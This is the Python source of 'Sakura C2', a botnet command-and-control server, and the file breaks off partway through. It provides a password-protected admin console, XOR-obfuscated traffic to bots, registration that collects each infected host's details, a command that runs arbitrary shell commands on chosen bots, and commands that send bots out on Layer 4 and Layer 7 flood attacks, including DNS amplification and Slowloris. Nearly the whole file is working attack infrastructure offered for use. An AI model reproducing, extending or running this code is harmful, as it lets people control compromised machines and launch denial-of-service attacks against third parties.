#!/usr/bin/env python3
"""
Sakura C2 — raw TCP admin interface + encrypted bot handler
Run on VPS: python3 c2_server.py
Connect via PuTTY: Raw mode, your_vps_ip:7777
"""

import socket
import threading
import time
import sys
import json
import os
import random
import string
import hashlib
import base64
import struct
import datetime

# ─── CONFIG ───
ADMIN_PORT   = 7777
BOT_PORT     = 7778
ADMIN_PASS   = "sakura"
MAX_BOTS     = 1000
BOT_TIMEOUT  = 90       # seconds before bot considered dead
PING_INTERVAL = 30
XOR_KEY      = b"sakura_c2_2024"
MAX_ATTACK_TIME = 3600   # 1 hour cap

# ─── ANSI COLORS ───
RST   = "\033[0m"
BOLD  = "\033[1m"
DIM   = "\033[2m"
DRED  = "\033[38;5;124m"
RED   = "\033[38;5;196m"
GREY  = "\033[38;5;240m"
LGREY = "\033[38;5;247m"
WHITE = "\033[38;5;255m"
GREEN = "\033[38;5;40m"
LGREEN= "\033[38;5;119m"
PINK  = "\033[38;5;205m"
DPINK = "\033[38;5;162m"
PURP  = "\033[38;5;129m"
LPURP = "\033[38;5;141m"
CYAN  = "\033[38;5;44m"
LCYAN = "\033[38;5;87m"
ORANGE= "\033[38;5;208m"
YELLOW= "\033[38;5;220m"
BLUE  = "\033[38;5;33m"

# ─── ASCII ART ───
CAT_ART = (
    f"                     {PURP}%@{RST}\n"
    f"                    {PURP}%{DPINK}@@@{PURP}%{RST}\n"
    f"                    {PURP}%{DPINK}@@@@{PURP}%{RST}        {PURP}@{DPINK}@@{PURP}@{RST}\n"
    f"                   {PURP}%{DPINK}@@@@@@{PURP}@@@@@@{DPINK}@@@@{PURP}@{RST}\n"
    f"                 {PURP}%%{DPINK}@@@@@@@@@@@@@@@@@@@{PURP}%%{RST}\n"
    f"                 {PURP}%{DPINK}@@@@{PURP}@@{DPINK}@@@@@@@@@@@@{PURP}@@@{PURP}%{RST}\n"
    f"                 {PURP}%{DPINK}@@@@@@@@@{PURP}@@{DPINK}@@@@@@@@@@@@@{PURP}%%{RST}\n"
    f"            {PURP}%%{PURP}%{RST}  {DPINK}#{PURP}@{DPINK}@@@@@@@@@@@@@@@@@@@@@{PURP}@@{DPINK}@@{PURP}%{RST}\n"
    f"         {PURP}%{DPINK}@@@@@@{PURP}%%{DPINK}@@@@@@@@@@@@@@@@@@@@{PURP}@%{RST}    {PURP}@%{RST}\n"
    f"       {PURP}%{DPINK}@@@@@@@@@@@@@@@@@@@@@@@@@@@@{PURP}@@@@%{RST}\n"
    f"      {PURP}%{DPINK}@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@{PURP}@%{RST}\n"
    f"     {PURP}@{DPINK}@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@{PURP}%{RST}\n"
    f"    {PURP}@{DPINK}@@@@{PURP}@@{DPINK}@{PURP}@%{RST}   {PURP}%{DPINK}@@@@@@@@@@@@@@@@@{PURP}@%{RST}\n"
    f"   {PURP}@{DPINK}@@{PURP}@%%{RST}         {PURP}%{DPINK}@@@@@@@@@@@@@@@@@{PURP}%{RST}\n"
    f"  {PURP}%@%{RST}            {PURP}%{DPINK}@@@@@@@@@@@@@@@@@@{DPINK}#{RST}\n"
    f"                {DPINK}#{PURP}@{DPINK}@@@@@@@@@@@@@@@@@@@@{PURP}%{RST}\n"
    f"                {DPINK}#{PURP}%{DPINK}@@@@@@@@@@@@@@@@@@@@{PURP}@%{RST}\n"
    f"                 {PURP}%{DPINK}@@@@@@@@@@@@@@@@@@@@@{DPINK}#{RST}\n"
    f" {PURP}%{DPINK}@@@@@{PURP}@@@@@{DPINK}@{PURP}@@@@%{PURP}@{DPINK}@@@@@@@@@@@@@@@@@@@{PURP}%{DPINK}#{RST}\n"
    f" {PURP}%{DPINK}@@@{PURP}@@@%%%%@@@{DPINK}@@@@@@@@@@@@@@@@@@@@@@@{DPINK}#{RST}\n"
    f"  {PURP}%%{RST}            {PURP}%%{DPINK}@@@@@@@@@@@@@@@@@@@@@@{PURP}@%{RST}\n"
    f"                  {PURP}%@{DPINK}@@@@@@@@@@@@@{PURP}@@@@@@@{RST}\n"
    f"                   {DPINK}#{PURP}@{DPINK}@@@@@{PURP}@%{PURP}@{DPINK}@@@@@{DPINK}#{RST}\n"
    f"                    {PURP}@@@@@@{PURP}% {PURP}%{PURP}@@@@@@{RST}\n"
)


# ─── XOR ENCRYPTION ───

def xor_crypt(data: bytes, key: bytes = XOR_KEY) -> bytes:
    out = bytearray(len(data))
    kl = len(key)
    for i in range(len(data)):
        out[i] = data[i] ^ key[i % kl]
    return bytes(out)


def send_encrypted(sock, data: dict) -> bool:
    try:
        raw = json.dumps(data).encode()
        encrypted = xor_crypt(raw)
        encoded = base64.b64encode(encrypted) + b"\n"
        sock.sendall(encoded)
        return True
    except Exception:
        return False


def recv_encrypted(sock) -> dict:
    try:
        buf = b""
        while True:
            chunk = sock.recv(4096)
            if not chunk:
                return None
            buf += chunk
            if b"\n" in buf:
                line = buf.split(b"\n", 1)[0]
                decrypted = xor_crypt(base64.b64decode(line))
                return json.loads(decrypted.decode())
    except Exception:
        return None


# ─── FORMATTING HELPERS ───

def _vis_len(s):
    n = 0
    i = 0
    while i < len(s):
        if s[i] == '\033':
            while i < len(s) and s[i] != 'm':
                i += 1
            i += 1
        else:
            n += 1
            i += 1
    return n


def fmt_time(ts):
    return datetime.datetime.fromtimestamp(ts).strftime("%H:%M:%S")


def fmt_duration(secs):
    secs = int(secs)
    if secs < 60:
        return f"{secs}s"
    m, s = divmod(secs, 60)
    if m < 60:
        return f"{m}m{s}s"
    h, m = divmod(m, 60)
    return f"{h}h{m}m"


def fmt_bytes(n):
    for unit in ("B", "KB", "MB", "GB"):
        if n < 1024:
            return f"{n:.1f}{unit}"
        n /= 1024
    return f"{n:.1f}TB"


def box_line(left, fill, mid, right, widths):
    parts = [left]
    for i, w in enumerate(widths):
        parts.append(fill * w)
        parts.append(mid if i < len(widths) - 1 else right)
    return f" {DRED}{''.join(parts)}{RST}"


def table_row(cells, widths, colors=None):
    parts = [f" {DRED}║{RST}"]
    for i, (cell, w) in enumerate(zip(cells, widths)):
        c = colors[i] if colors else LGREY
        text = str(cell)[:w-2]
        parts.append(f" {c}{text:<{w-2}}{RST} {DRED}║{RST}")
    return "".join(parts)


# ─── BANNER ───

def make_banner(bot_count, username, uptime_str, attack_count, running):
    sep = f"{DRED}{'─' * 60}{RST}"

    cat_lines = CAT_ART.split("\n")
    while cat_lines and not cat_lines[0].strip():
        cat_lines.pop(0)
    while cat_lines and not cat_lines[-1].strip():
        cat_lines.pop()

    min_ws = min((len(l) - len(l.lstrip(' ')) for l in cat_lines if l.strip()), default=0)
    cat_lines = [l[min_ws:] for l in cat_lines]

    stats = [
        f" {GREY}User:{RST}      {PINK}{username}{RST}",
        f" {GREY}Bots:{RST}      {WHITE}{bot_count}{RST}",
        f" {GREY}Uptime:{RST}    {WHITE}{uptime_str}{RST}",
        f" {GREY}Attacks:{RST}   {WHITE}{attack_count}{RST}",
        f" {GREY}Running:{RST}   {WHITE}{running}{RST}",
        f" {GREY}Encrypted:{RST} {GREEN}Yes{RST} {GREY}(XOR){RST}",
    ]

    SW = 24
    start = (len(cat_lines) - len(stats)) // 2

    merged = []
    for i, cl in enumerate(cat_lines):
        si = i - start
        if 0 <= si < len(stats):
            s = stats[si]
            pad = SW - _vis_len(s)
            if pad > 0:
                s += " " * pad
            merged.append(s + cl)
        else:
            merged.append(" " * SW + cl)

    body = "\n".join(merged)
    return (f"\n{sep}\n\n{body}\n\n{sep}\n").replace("\n", "\r\n")


def make_title(bot_count, uptime_str, running):
    return f"\033]0;Sakura C2 | Bots: {bot_count} | Uptime: {uptime_str} | Running: {running}\007"


# ─── HELP TEXT ───

def make_help():
    W = 56
    h = f" {DRED}║{RST}"
    e = f"{DRED}║{RST}"

    def section(title):
        return (
            f" {DRED}╠{'═'*W}╣{RST}\r\n"
            f"{h}  {WHITE}{title}{RST}{' '*(W-len(title)-3)}{e}\r\n"
            f" {DRED}╠{'═'*W}╣{RST}\r\n"
        )

    def cmd(name, args, desc):
        left = f"  {PINK}{name}{RST} {GREY}{args}{RST}"
        raw_len = len(name) + 1 + len(args) + 2
        pad = W - raw_len - len(desc) - 1
        if pad < 1:
            pad = 1
        return f"{h}{left}{' '*pad}{LGREY}{desc}{RST} {e}\r\n"

    return (
        f"\r\n {DRED}╔{'═'*W}╗{RST}\r\n"
        f"{h}  {BOLD}{PINK}SAKURA C2{RST} {GREY}— Command Reference{RST}{' '*(W-30)}{e}\r\n"
        + section("LAYER 4 ATTACKS")
        + cmd("!udp", "<ip> <port> <time> [threads]", "UDP flood")
        + cmd("!tcp", "<ip> <port> <time> [threads]", "TCP SYN flood")
        + cmd("!syn", "<ip> <port> <time> [threads]", "SYN connect flood")
        + cmd("!ack", "<ip> <port> <time> [threads]", "ACK push flood")
        + cmd("!icmp", "<ip> <time> [threads]", "ICMP ping flood")
        + cmd("!gre", "<ip> <time> [threads]", "GRE tunnel flood")
        + cmd("!dns", "<ip> <port> <time> [threads]", "DNS amplification")
        + cmd("!vse", "<ip> <port> <time> [threads]", "Valve Source query")
        + section("LAYER 7 ATTACKS")
        + cmd("!http", "<url> <time> [threads]", "HTTP GET flood")
        + cmd("!post", "<url> <time> [threads]", "HTTP POST flood")
        + cmd("!slow", "<ip> <port> <time>", "Slowloris hold")
        + cmd("!head", "<url> <time> [threads]", "HTTP HEAD flood")
        + section("ATTACK CONTROL")
        + cmd("!stop", "", "Stop all attacks")
        + cmd("!running", "", "Show active attacks")
        + cmd("!history", "", "Attack log")
        + section("BOT MANAGEMENT")
        + cmd("!bots", "", "List connected bots")
        + cmd("!count", "", "Bot count")
        + cmd("!ping", "", "Ping all bots")
        + cmd("!kick", "<id|all>", "Disconnect bot(s)")
        + cmd("!info", "<id>", "Detailed bot info")
        + cmd("!shell", "<id> <cmd>", "Run shell on a bot")
        + cmd("!broadcast", "<msg>", "Message all bots")
        + section("SERVER")
        + cmd("!status", "", "Server status")
        + cmd("!methods", "", "Methods detail")
        + cmd("!clear", "", "Clear screen")
        + cmd("!banner", "", "Redraw banner")
        + cmd("!help", "", "This menu")
        + cmd("!exit", "", "Disconnect")
        + f" {DRED}╚{'═'*W}╝{RST}\r\n"
    )


METHODS_TEXT = (
    f"\r\n"
    f" {DRED}╔{'═'*56}╗{RST}\r\n"
    f" {DRED}║{RST}  {WHITE}LAYER 4 — Transport{RST}{' '*36}{DRED}║{RST}\r\n"
    f" {DRED}╠{'═'*56}╣{RST}\r\n"
    f" {DRED}║{RST}  {PINK}UDP{RST}        {LGREY}Raw UDP random payload flood{RST}              {DRED}║{RST}\r\n"
    f" {DRED}║{RST}  {PINK}TCP{RST}        {LGREY}TCP connect flood (SYN handshake){RST}         {DRED}║{RST}\r\n"
    f" {DRED}║{RST}  {PINK}SYN{RST}        {LGREY}SYN connection storm{RST}                      {DRED}║{RST}\r\n"
    f" {DRED}║{RST}  {PINK}ACK{RST}        {LGREY}ACK push data flood{RST}                       {DRED}║{RST}\r\n"
    f" {DRED}║{RST}  {PINK}ICMP{RST}       {LGREY}ICMP echo (ping) flood{RST}                    {DRED}║{RST}\r\n"
    f" {DRED}║{RST}  {PINK}GRE{RST}        {LGREY}GRE protocol tunnel flood{RST}                 {DRED}║{RST}\r\n"
    f" {DRED}║{RST}  {PINK}DNS{RST}        {LGREY}DNS amplification via open resolvers{RST}       {DRED}║{RST}\r\n"
    f" {DRED}║{RST}  {PINK}VSE{RST}        {LGREY}Valve Source Engine query flood{RST}            {DRED}║{RST}\r\n"
    f" {DRED}╠{'═'*56}╣{RST}\r\n"
    f" {DRED}║{RST}  {WHITE}LAYER 7 — Application{RST}{' '*34}{DRED}║{RST}\r\n"
    f" {DRED}╠{'═'*56}╣{RST}\r\n"
    f" {DRED}║{RST}  {PINK}HTTP{RST}       {LGREY}HTTP GET request flood{RST}                     {DRED}║{RST}\r\n"
    f" {DRED}║{RST}  {PINK}POST{RST}       {LGREY}HTTP POST data flood{RST}                      {DRED}║{RST}\r\n"
    f" {DRED}║{RST}  {PINK}HEAD{RST}       {LGREY}HTTP HEAD lightweight flood{RST}                {DRED}║{RST}\r\n"
    f" {DRED}║{RST}  {PINK}SLOWLORIS{RST}  {LGREY}Slow header connection exhaustion{RST}          {DRED}║{RST}\r\n"
    f" {DRED}╚{'═'*56}╝{RST}\r\n"
)


# ─── DATA CLASSES ───

class Bot:
    __slots__ = ('sock', 'addr', 'id', 'connect_time', 'last_ping',
                 'os_info', 'hostname', 'username', 'arch', 'pid',
                 'country', 'alive', 'version')

    def __init__(self, sock, addr):
        self.sock = sock
        self.addr = addr
        self.id = ''.join(random.choices(string.hexdigits[:16], k=8))
        self.connect_time = time.time()
        self.last_ping = time.time()
        self.os_info = "unknown"
        self.hostname = "unknown"
        self.username = "unknown"
        self.arch = "unknown"
        self.pid = 0
        self.country = "??"
        self.alive = True
        self.version = "1.0"


class AdminSession:
    __slots__ = ('sock', 'addr', 'authed', 'username')

    def __init__(self, sock, addr):
        self.sock = sock
        self.addr = addr
        self.authed = False
        self.username = "admin"


class AttackRecord:
    __slots__ = ('method', 'target', 'port', 'duration', 'threads',
                 'bots_sent', 'start_time', 'active')

    def __init__(self, method, target, port, duration, threads, bots_sent):
        self.method = method
        self.target = target
        self.port = port
        self.duration = duration
        self.threads = threads
        self.bots_sent = bots_sent
        self.start_time = time.time()
        self.active = True


# ─── C2 SERVER ───

class C2Server:
    def __init__(self):
        self.bots = {}
        self.admins = []
        self.lock = threading.Lock()
        self.attack_history = []
        self.start_time = time.time()
        self.total_attacks = 0
        self.shell_responses = {}   # bot_id -> list of pending responses

    @property
    def running_attacks(self):
        return sum(1 for a in self.attack_history if a.active)

    def uptime_str(self):
        return fmt_duration(time.time() - self.start_time)

    # ─── NETWORKING ───

    def send_to_bot(self, bot, data):
        return send_encrypted(bot.sock, data)

    def recv_from_bot(self, bot):
        return recv_encrypted(bot.sock)

    def send_to_admin(self, admin, text):
        try:
            admin.sock.sendall(text.encode())
        except Exception:
            pass

    def send_prompt(self, admin):
        n = len(self.bots)
        prompt = f"\r\n {PINK}{admin.username}{GREY}@{DRED}sakura{RST} {GREY}[{WHITE}{n}{GREY}]{RST} > "
        self.send_to_admin(admin, prompt)

    def update_title(self, admin):
        t = make_title(len(self.bots), self.uptime_str(), self.running_attacks)
        self.send_to_admin(admin, t)

    def broadcast_admin(self, text):
        with self.lock:
            for a in list(self.admins):
                self.send_to_admin(a, text)

    def broadcast_prompt(self):
        with self.lock:
            for a in list(self.admins):
                self.send_prompt(a)

    def broadcast_title(self):
        with self.lock:
            for a in list(self.admins):
                self.update_title(a)

    # ─── BOT LISTENER ───

    def bot_listener(self):
        srv = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        srv.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        srv.bind(("0.0.0.0", BOT_PORT))
        srv.listen(MAX_BOTS)
        print(f"[*] Bot listener on :{BOT_PORT}")

        while True:
            try:
                conn, addr = srv.accept()
                conn.settimeout(60)
                t = threading.Thread(target=self.handle_bot, args=(conn, addr), daemon=True)
                t.start()
            except Exception:
                pass

    def handle_bot(self, conn, addr):
        bot = Bot(conn, addr)

        # wait for registration
        reg = recv_encrypted(conn)
        if reg and reg.get("type") == "register":
            bot.os_info = reg.get("os", "unknown")
            bot.hostname = reg.get("hostname", "unknown")
            bot.username = reg.get("username", "unknown")
            bot.arch = reg.get("arch", "unknown")
            bot.pid = reg.get("pid", 0)
            bot.version = reg.get("version", "1.0")
            # send ack with assigned ID
            send_encrypted(conn, {"type": "registered", "id": bot.id})
        else:
            try:
                conn.close()
            except Exception:
                pass
            return

        with self.lock:
            self.bots[bot.id] = bot

        os_short = bot.os_info.split()[0] if bot.os_info else "?"
        self.broadcast_admin(
            f"\r\n {GREEN}[+]{RST} {GREY}Bot connected:{RST} {WHITE}{bot.id}{RST} "
            f"{GREY}({addr[0]}){RST} {GREY}[{os_short}]{RST} "
            f"{GREY}as{RST} {LCYAN}{bot.username}@{bot.hostname}{RST}"
        )
        self.broadcast_prompt()
        self.broadcast_title()
        print(f"[+] Bot {bot.id} from {addr[0]}:{addr[1]} ({bot.hostname})")

        # main recv loop
        while bot.alive:
            try:
                data = recv_encrypted(conn)
                if data is None:
                    break

                msg_type = data.get("type", "")

                if msg_type == "pong":
                    bot.last_ping = time.time()

                elif msg_type == "shell_result":
                    bid = bot.id
                    output = data.get("output", "")
                    self.broadcast_admin(
                        f"\r\n {CYAN}[SHELL {bid}]{RST}\r\n{LGREY}{output}{RST}"
                    )
                    self.broadcast_prompt()

                elif msg_type == "status":
                    self.broadcast_admin(
                        f"\r\n {GREY}[BOT {bot.id}]{RST} {LGREY}{data.get('msg', '')}{RST}"
                    )
                    self.broadcast_prompt()

            except socket.timeout:
                continue
            except Exception:
                break

        with self.lock:
            self.bots.pop(bot.id, None)
        try:
            conn.close()
        except Exception:
            pass

        self.broadcast_admin(
            f"\r\n {DRED}[-]{RST} {GREY}Bot disconnected:{RST} {WHITE}{bot.id}{RST} "
            f"{GREY}({bot.hostname}){RST}"
        )
        self.broadcast_prompt()
        self.broadcast_title()
        print(f"[-] Bot {bot.id} disconnected")

    # ─── ADMIN LISTENER ───

    def admin_listener(self):
        srv = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        srv.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        srv.bind(("0.0.0.0", ADMIN_PORT))
        srv.listen(5)
        print(f"[*] Admin listener on :{ADMIN_PORT}")

        while True:
            try:
                conn, addr = srv.accept()
                conn.settimeout(300)
                t = threading.Thread(target=self.handle_admin, args=(conn, addr), daemon=True)
                t.start()
            except Exception:
                pass

    def handle_admin(self, conn, addr):
        admin = AdminSession(conn, addr)
        print(f"[*] Admin connection from {addr[0]}:{addr[1]}")

        def read_line():
            buf = b""
            while True:
                c = conn.recv(1)
                if not c:
                    return buf
                if c in (b"\r", b"\n"):
                    if c == b"\r":
                        # consume optional \n
                        conn.settimeout(0.1)
                        try:
                            nx = conn.recv(1)
                            if nx and nx != b"\n":
                                buf += nx
                        except socket.timeout:
                            pass
                        conn.settimeout(300)
                    return buf
                buf += c

        # ─── AUTH SCREEN ───
        self.send_to_admin(admin, "\033[2J\033[H")
        self.send_to_admin(admin,
            f"\r\n{DRED}  ┌─────────────────────────────────────┐{RST}\r\n"
            f"{DRED}  │{RST}  {DIM}Authorized personnel only.{RST}          {DRED}│{RST}\r\n"
            f"{DRED}  │{RST}  {DIM}All sessions logged.{RST}                {DRED}│{RST}\r\n"
            f"{DRED}  └─────────────────────────────────────┘{RST}\r\n\r\n"
        )
        self.send_to_admin(admin, f" {DRED}>{RST} {WHITE}Username{RST} :: ")

        try:
            username = read_line()
        except Exception:
            conn.close()
            return
        admin.username = username.decode(errors='ignore').strip() or "admin"

        self.send_to_admin(admin, f" {DRED}>{RST} {WHITE}Password{RST} :: ")
        try:
            pw = read_line()
        except Exception:
            conn.close()
            return

        if pw.decode(errors='ignore').strip() != ADMIN_PASS:
            self.send_to_admin(admin, f"\r\n {RED}  [x] Access denied.{RST}\r\n")
            time.sleep(1)
            conn.close()
            return

        admin.authed = True
        with self.lock:
            self.admins.append(admin)

        # show banner
        self.send_to_admin(admin, "\033[2J\033[H")
        self.update_title(admin)
        banner = make_banner(
            len(self.bots), admin.username, self.uptime_str(),
            self.total_attacks, self.running_attacks
        )
        self.send_to_admin(admin, banner)
        self.send_to_admin(admin,
            f"\r\n {GREEN}[+]{RST} {LGREY}Welcome back,{RST} {PINK}{admin.username}{RST}\r\n"
            f" {GREY}Type {PINK}!help{GREY} for commands{RST}"
        )
        self.send_prompt(admin)

        # ─── COMMAND LOOP ───
        buf = b""
        while True:
            try:
                chunk = conn.recv(4096)
                if not chunk:
                    break
                buf += chunk

                while b"\n" in buf or b"\r" in buf:
                    for sep in (b"\r\n", b"\n", b"\r"):
                        if sep in buf:
                            line, buf = buf.split(sep, 1)
                            break
                    cmd = line.decode(errors='ignore').strip()
                    if not cmd:
                        self.send_prompt(admin)
                        continue
                    self.process_command(admin, cmd)

            except socket.timeout:
                self.update_title(admin)
                continue
            except Exception:
                break

        with self.lock:
            if admin in self.admins:
                self.admins.remove(admin)
        try:
            conn.close()
        except Exception:
            pass
        print(f"[-] Admin {addr[0]} disconnected")

    # ─── COMMANDS ───

    def process_command(self, admin, cmd):
        parts = cmd.split()
        op = parts[0].lower()

        try:
            if op == "!help":
                self.send_to_admin(admin, make_help())

            elif op == "!methods":
                self.send_to_admin(admin, METHODS_TEXT)

            elif op == "!bots":
                self._cmd_bots(admin)

            elif op == "!count":
                n = len(self.bots)
                self.send_to_admin(admin,
                    f"\r\n {GREY}Bots online:{RST} {WHITE}{n}{RST}"
                )

            elif op == "!ping":
                with self.lock:
                    for b in list(self.bots.values()):
                        self.send_to_bot(b, {"type": "ping"})
                self.send_to_admin(admin,
                    f"\r\n {GREEN}[+]{RST} {GREY}Pinged{RST} {WHITE}{len(self.bots)}{RST} {GREY}bots{RST}"
                )

            elif op == "!kick":
                self._cmd_kick(admin, parts)

            elif op == "!info":
                self._cmd_info(admin, parts)

            elif op == "!shell":
                self._cmd_shell(admin, parts)

            elif op == "!broadcast" and len(parts) >= 2:
                msg = " ".join(parts[1:])
                with self.lock:
                    for b in list(self.bots.values()):
                        self.send_to_bot(b, {"type": "broadcast", "msg": msg})
                self.send_to_admin(admin,
                    f"\r\n {GREEN}[+]{RST} {GREY}Broadcast to{RST} {WHITE}{len(self.bots)}{RST} {GREY}bots{RST}"
                )

            elif op == "!status":
                self._cmd_status(admin)

            elif op == "!running":
                self._cmd_running(admin)

            elif op == "!history":
                self._cmd_history(admin)

            elif op == "!clear":
                self.send_to_admin(admin, "\033[2J\033[H")
                self.update_title(admin)

            elif op == "!banner":
                self.send_to_admin(admin, "\033[2J\033[H")
                self.update_title(admin)
                banner = make_banner(
                    len(self.bots), admin.username, self.uptime_str(),
                    self.total_attacks, self.running_attacks
                )
                self.send_to_admin(admin, banner)

            elif op == "!exit":
                self.send_to_admin(admin, f"\r\n {GREY}Goodbye.{RST}\r\n")
                try:
                    admin.sock.close()
                except Exception:
                    pass
                return

            elif op == "!stop":
                with self.lock:
                    for b in list(self.bots.values()):
                        self.send_to_bot(b, {"type": "stop"})
                    for a in self.attack_history:
                        a.active = False
                self.send_to_admin(admin,
                    f"\r\n {DRED}[#]{RST} {GREY}Stop sent to{RST} {WHITE}{len(self.bots)}{RST} {GREY}bots{RST}"
                )
                self.broadcast_title()

            # ─── ATTACK COMMANDS ───
            elif op in ("!udp", "!tcp", "!syn", "!ack", "!dns", "!vse", "!gre"):
                self._cmd_l4_attack(admin, parts, op[1:])

            elif op == "!icmp":
                # icmp: !icmp <ip> <time> [threads]  (no port)
                if len(parts) < 3:
                    self.send_to_admin(admin, f"\r\n {RED}[x]{RST} {GREY}Usage:{RST} !icmp <ip> <time> [threads]")
                else:
                    target = parts[1]
                    duration = min(int(parts[2]), MAX_ATTACK_TIME)
                    threads = int(parts[3]) if len(parts) >= 4 else 1
                    self._send_attack(admin, "icmp", target, 0, duration, threads)

            elif op in ("!http", "!post", "!head"):
                method = {"!http": "http", "!post": "post", "!head": "head"}[op]
                if len(parts) < 3:
                    self.send_to_admin(admin, f"\r\n {RED}[x]{RST} {GREY}Usage:{RST} {op} <url> <time> [threads]")
                else:
                    url = parts[1]
                    duration = min(int(parts[2]), MAX_ATTACK_TIME)
                    threads = int(parts[3]) if len(parts) >= 4 else 1
                    self._send_attack(admin, method, url, 80, duration, threads)

            elif op == "!slow":
                if len(parts) < 4:
                    self.send_to_admin(admin, f"\r\n {RED}[x]{RST} {GREY}Usage:{RST} !slow <ip> <port> <time>")
                else:
                    target = parts[1]
                    port = int(parts[2])
                    duration = min(int(parts[3]), MAX_ATTACK_TIME)
                    self._send_attack(admin, "slowloris", target, port, duration, 1)

            else:
                self.send_to_admin(admin,
                    f"\r\n {RED}[x]{RST} {GREY}Unknown command. Type{RST} {PINK}!help{RST}"
                )

        except (ValueError, IndexError) as e:
            self.send_to_admin(admin,
                f"\r\n {RED}[x]{RST} {GREY}Bad arguments:{RST} {WHITE}{e}{RST}"
            )

        self.send_prompt(admin)

    # ─── COMMAND IMPLEMENTATIONS ───

    def _cmd_bots(self, admin):
        with self.lock:
            bots = list(self.bots.values())

        if not bots:
            self.send_to_admin(admin, f"\r\n {GREY}No bots connected.{RST}")
            return

        widths = [10, 18, 16, 14, 10, 8]
        headers = ["ID", "Address", "User@Host", "OS", "Uptime", "Arch"]

        self.send_to_admin(admin, "\r\n" + box_line("╔", "═", "╦", "╗", widths))
        self.send_to_admin(admin, "\r\n" + table_row(headers, widths, [WHITE]*6))
        self.send_to_admin(admin, "\r\n" + box_line("╠", "═", "╬", "╣", widths))

        for b in bots:
            uptime = fmt_duration(time.time() - b.connect_time)
            addr = f"{b.addr[0]}:{b.addr[1]}"
            uh = f"{b.username}@{b.hostname}"[:14]
            os_short = b.os_info.split()[0] if b.os_info != "unknown" else "?"
            colors = [PINK, LGREY, LCYAN, LGREY, LGREY, LGREY]
            self.send_to_admin(admin, "\r\n" + table_row(
                [b.id, addr, uh, os_short, uptime, b.arch], widths, colors
            ))

        self.send_to_admin(admin, "\r\n" + box_line("╚", "═", "╩", "╝", widths))
        self.send_to_admin(admin,
            f"\r\n {GREY}Total:{RST} {WHITE}{len(bots)}{RST}"
        )

    def _cmd_kick(self, admin, parts):
        if len(parts) < 2:
            self.send_to_admin(admin, f"\r\n {RED}[x]{RST} {GREY}Usage:{RST} !kick <id|all>")
            return

        target = parts[1].lower()

        if target == "all":
            with self.lock:
                count = len(self.bots)
                for b in list(self.bots.values()):
                    b.alive = False
                    try:
                        b.sock.close()
                    except Exception:
                        pass
            self.send_to_admin(admin,
                f"\r\n {DRED}[#]{RST} {GREY}Kicked{RST} {WHITE}{count}{RST} {GREY}bots{RST}"
            )
        else:
            with self.lock:
                b = self.bots.get(target)
                if b:
                    b.alive = False
                    try:
                        b.sock.close()
                    except Exception:
                        pass
                    self.send_to_admin(admin,
                        f"\r\n {DRED}[#]{RST} {GREY}Kicked{RST} {WHITE}{target}{RST}"
                    )
                else:
                    self.send_to_admin(admin,
                        f"\r\n {RED}[x]{RST} {GREY}Not found:{RST} {WHITE}{target}{RST}"
                    )

    def _cmd_info(self, admin, parts):
        if len(parts) < 2:
            self.send_to_admin(admin, f"\r\n {RED}[x]{RST} {GREY}Usage:{RST} !info <id>")
            return

        bid = parts[1]
        with self.lock:
            b = self.bots.get(bid)

        if not b:
            self.send_to_admin(admin, f"\r\n {RED}[x]{RST} {GREY}Not found:{RST} {WHITE}{bid}{RST}")
            return

        up = fmt_duration(time.time() - b.connect_time)
        last = fmt_duration(time.time() - b.last_ping)
        sep = f"{DRED}{'─'*44}{RST}"
        self.send_to_admin(admin,
            f"\r\n {sep}"
            f"\r\n  {GREY}ID:{RST}        {PINK}{b.id}{RST}"
            f"\r\n  {GREY}Address:{RST}   {WHITE}{b.addr[0]}:{b.addr[1]}{RST}"
            f"\r\n  {GREY}Hostname:{RST}  {WHITE}{b.hostname}{RST}"
            f"\r\n  {GREY}Username:{RST}  {LCYAN}{b.username}{RST}"
            f"\r\n  {GREY}OS:{RST}        {WHITE}{b.os_info}{RST}"
            f"\r\n  {GREY}Arch:{RST}      {WHITE}{b.arch}{RST}"
            f"\r\n  {GREY}PID:{RST}       {WHITE}{b.pid}{RST}"
            f"\r\n  {GREY}Version:{RST}   {WHITE}{b.version}{RST}"
            f"\r\n  {GREY}Uptime:{RST}    {WHITE}{up}{RST}"
            f"\r\n  {GREY}Last ping:{RST} {WHITE}{last} ago{RST}"
            f"\r\n {sep}"
        )

    def _cmd_shell(self, admin, parts):
        if len(parts) < 3:
            self.send_to_admin(admin, f"\r\n {RED}[x]{RST} {GREY}Usage:{RST} !shell <id> <command>")
            return

        bid = parts[1]
        shell_cmd = " ".join(parts[2:])

        with self.lock:
            b = self.bots.get(bid)

        if not b:
            self.send_to_admin(admin, f"\r\n {RED}[x]{RST} {GREY}Not found:{RST} {WHITE}{bid}{RST}")
            return

        self.send_to_bot(b, {"type": "shell", "cmd": shell_cmd})
        self.send_to_admin(admin,
            f"\r\n {CYAN}>{RST} {GREY}Sent to{RST} {WHITE}{bid}{RST}{GREY}:{RST} {DIM}{shell_cmd}{RST}"
        )

    def _cmd_status(self, admin):
        sep = f"{DRED}{'─'*44}{RST}"
        self.send_to_admin(admin,
            f"\r\n {sep}"
            f"\r\n  {GREY}Uptime:{RST}         {WHITE}{self.uptime_str()}{RST}"
            f"\r\n  {GREY}Bots:{RST}           {WHITE}{len(self.bots)}{RST}"
            f"\r\n  {GREY}Total attacks:{RST}  {WHITE}{self.total_attacks}{RST}"
            f"\r\n  {GREY}Running:{RST}        {WHITE}{self.running_attacks}{RST}"
            f"\r\n  {GREY}Admins:{RST}         {WHITE}{len(self.admins)}{RST}"
            f"\r\n  {GREY}Admin port:{RST}     {WHITE}{ADMIN_PORT}{RST}"
            f"\r\n  {GREY}Bot port:{RST}       {WHITE}{BOT_PORT}{RST}"
            f"\r\n  {GREY}Encryption:{RST}     {GREEN}XOR{RST}"
            f"\r\n  {GREY}Max bots:{RST}       {WHITE}{MAX_BOTS}{RST}"
            f"\r\n  {GREY}Bot timeout:{RST}    {WHITE}{BOT_TIMEOUT}s{RST}"
            f"\r\n {sep}"
        )

    def _cmd_running(self, admin):
        active = [a for a in self.attack_history if a.active]
        if not active:
            self.send_to_admin(admin, f"\r\n {GREY}No active attacks.{RST}")
            return

        for i, a in enumerate(active):
            elapsed = time.time() - a.start_time
            remaining = max(0, a.duration - elapsed)
